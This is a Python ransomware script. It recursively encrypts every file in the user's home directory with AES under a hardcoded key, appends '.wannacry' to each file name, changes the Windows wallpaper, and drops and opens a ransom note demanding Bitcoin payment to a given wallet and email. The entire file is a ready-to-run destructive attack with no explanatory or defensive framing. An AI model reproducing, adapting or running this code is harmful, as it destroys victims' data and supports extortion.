import subprocess
import requests;
from time import sleep
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import ctypes


def explore_directories():
    home_directory = os.path.expanduser("~")
    # documents_dir = os.path.join(os.environ['USERPROFILE'], 'Documents')
    # current_directory = os.getcwd()
    # home_directory = os.path.join(current_directory, 'localroot')
    all_files = []
    for root, dirs, files in os.walk(home_directory):
    # for root, _, files in os.walk(documents_dir):
        for file in files:

            full_path = os.path.join(root, file)
            all_files.append(full_path)

    return all_files

def encrypt_files(file_path, key, iv):
    

    cipher = AES.new(key.encode('utf-8'), AES.MODE_CBC, iv.encode('utf-8'))
    try:
        with open(file_path, 'rb') as f:
            content = f.read()
    except Exception as err:
        print(err)
        return

    cipher_text = cipher.encrypt(pad(content, AES.block_size))

    try:
        with open(file_path, 'wb') as f:
            f.write(cipher_text)
        os.rename(file_path, file_path+".wannacry")
    except Exception as err:
        print(err)
        return
    

def change_wallpaper(image_path):
    # Check if the file exists
    if not os.path.isfile(image_path):
        
        return
    
    # Change the wallpaper
    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
  

# Example usage
# Make sure to provide the full path to the image file you want to set as the wallpaper


def create_ransom_note():
    ransom_text = """
    ALL YOUR FILES HAVE BEEN ENCRYPTED

    Your important files, documents, and data have been locked and are inaccessible. But don’t worry, you can still get them back… for a price.

    What happened?
    We have encrypted all critical files on your system. Without our decryption tool, you cannot access or use your data.

    How to recover your files:
    1. Purchase the decryption key: To restore your data, you need to purchase a unique decryption key.  
    2. Send 0.05 Bitcoin to our address: 15wpFgbGsxjVM4UzBAmpwcBzdeBxmLUUeS  
    3. After payment, send a confirmation email to: support@decryptionservice.com  
       - In your email, include your unique ID: [Unique ID Here]

    No payment?
    If payment is not received within 48 hours, your decryption key will be permanently deleted, and your data will be lost forever.

    Tick-tock… time is running out.
    """
    
  
    with open("README_TO_DECRYPT.txt", "w") as file:
        file.write(ransom_text)


def main():
    secret_keys = "ThisIsA32ByteKeyForAES123456789012<s>ThisIsAnIV123456"
   
    key = secret_keys.split("<s>")[0][:-2]
    iv = secret_keys.split("<s>")[1]        
    files_list = explore_directories()
    for file in files_list:
        encrypt_files(file, key, iv)
    current_directory = os.getcwd()
    image_path = os.path.join(current_directory, 'rans.png')
    change_wallpaper(image_path)
    create_ransom_note()
    os.startfile("README_TO_DECRYPT.txt")



if __name__ == '__main__':
    main()


# L4GtDGKjnpo2j5j1WHyP19kVSryGGtYsY9nWZ7RmPB2S4jd2L317
